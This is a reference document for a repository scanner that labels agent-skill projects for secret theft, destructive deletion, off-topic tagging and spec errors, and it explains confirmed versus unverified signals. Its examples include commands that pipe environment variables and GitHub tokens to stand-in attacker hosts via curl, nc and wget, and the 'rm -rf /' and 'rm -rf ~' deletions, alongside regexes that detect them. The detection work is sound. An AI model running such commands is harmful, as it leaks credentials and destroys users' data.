# Security Label Detection Reference

Detection patterns used by `analyze-repos.py` to assign security signal labels.

## Two confidence levels

Security signals use two levels to avoid false accusations:

| Level | Label suffix | Icon | Meaning |
|-------|-------------|------|---------|
| **Confirmed** | `env-stealer`, `rm-rf` | 🚨 💥 | Pattern is unambiguously dangerous. No legitimate use case matches it. |
| **Unverified** | `env-stealer?`, `rm-rf?` | ⚠️ | Pattern is suspicious but also appears in legitimate scripts. Needs human review before drawing conclusions. |

A confirmed signal always supersedes the unverified signal for the same type.

---

## `env-stealer` 🚨 — Confirmed

Applied when scripts **clearly pipe environment variables to a remote destination**.

**Detection patterns (regex):**

```
(env|printenv|set)\s*\|.*curl
```
Example: `env | curl -X POST https://attacker.com`

```
curl[^|]*\$\{?GITHUB_TOKEN[^|]*\|\s*nc\b
```
Example: `curl -H "Auth: $GITHUB_TOKEN" https://evil.com | nc attacker.com 4444`

**What is NOT flagged as confirmed:**
- `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com` — legitimate GitHub API call

---

## `env-stealer?` ⚠️ — Unverified

Applied when scripts use a secret in a curl/wget call — suspicious but very
common in legitimate CI scripts.

**Detection patterns (regex):**

```
curl.*\$\{?GITHUB_TOKEN
```
Example: `curl -H "Authorization: $GITHUB_TOKEN" https://api.github.com` ← legitimate

```
curl.*\$\{?secrets\.
```
Example: `curl ... "${{ secrets.MY_SECRET }}"` ← common in GitHub Actions

```
wget.*\$(HOME|USER|PATH)\b
```
Example: `wget https://attacker.com?u=$USER` ← suspicious

**Human review guidance:** Check if the curl target is a well-known API
(GitHub, npm, PyPI) — if so, almost certainly a false positive. If the
target is an unknown or unusual URL, treat as a real finding.

---

## `rm-rf` 💥 — Confirmed

Applied only when `rm -rf` targets a **clearly destructive path** with no
legitimate use case.

**Detection patterns (regex):**

```
rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+/\*?(?:\s|$)
```
Matches: `rm -rf /` or `rm -rf /*` — deletes root filesystem

```
rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+~/?(?:\s|$)
```
Matches: `rm -rf ~` or `rm -rf ~/` — deletes home directory

```
rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+\*(?:\s|$)
```
Matches: `rm -rf *` — bare wildcard, deletes everything in current directory

**What is NOT flagged as confirmed:**
- `rm -rf ./dist` — explicit relative path, safe
- `rm -rf ./tmp` — safe cleanup
- `rm -rf node_modules` — safe cleanup
- `rm -rf $BUILD_DIR/output` — variable with explicit subpath

---

## `rm-rf?` ⚠️ — Unverified

Applied when `rm -rf` uses a bare variable — could be safe or dangerous
depending on what the variable contains at runtime.

**Detection patterns (regex):**

```
rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+\$\{?\w+\}?\s*(?:#.*)?$
```
Matches: `rm -rf $TMPDIR` or `rm -rf ${BUILD_DIR}` at end of line

**Human review guidance:** Find where the variable is set. If it is always
a specific subdirectory (e.g. `BUILD_DIR=./dist`), it is a false positive.
If the variable could ever be empty or set to `/`, it is a real finding.

**What is NOT flagged as unverified:**
- `rm -rf $TMPDIR/my-specific-subpath` — explicit subpath after the variable

---

## `misleading` ⚠️

Applied when a repository has the `agent-skills` topic but shows no meaningful
connection to the Agent Skills specification.

**Heuristic (all conditions must be true):**
1. No `SKILL.md` file found anywhere in the repository tree
2. Description contains none of: `skill`, `agent`, `claude`, `llm`, `ai agent`, `SKILL.md`, `agentskills`, `assistant`, `copilot`
3. Topics do not include: `skill`, `agent`, `claude`, `llm`
4. Primary language is not Python, Shell, TypeScript, or JavaScript

**Severity:** Low. The repository is likely using the topic for SEO.
Not dangerous, just off-topic.

---

## `spec-errors` ❌

Applied when a `SKILL.md` file is found but its frontmatter fails validation
against the agentskills.io specification.

**Common causes:**
- `name` contains uppercase letters or underscores
- `name` starts or ends with a hyphen, or contains consecutive hyphens (`--`)
- `name` exceeds 64 characters
- `description` exceeds 1024 characters
- `description` is empty

**Severity:** Informational. The skill may still work in some agents but is
not guaranteed to be compatible with all spec-compliant implementations.

---

## Reporting false positives

If you believe a label is incorrect:

- For `rm-rf?` or `env-stealer?` — open an issue in `roebi/awesome-agent-skills`
  with a link to the specific file and an explanation of why it is safe.
- For confirmed `rm-rf` or `env-stealer` — if you are the maintainer of the
  flagged repo and believe it is wrong, open an issue with the exact line and context.
- **Never** report a confirmed security finding as a public GitHub Issue on the
  target repo. Use GitHub's private security advisory system instead:
  `https://github.com/OWNER/REPO/security/advisories/new`
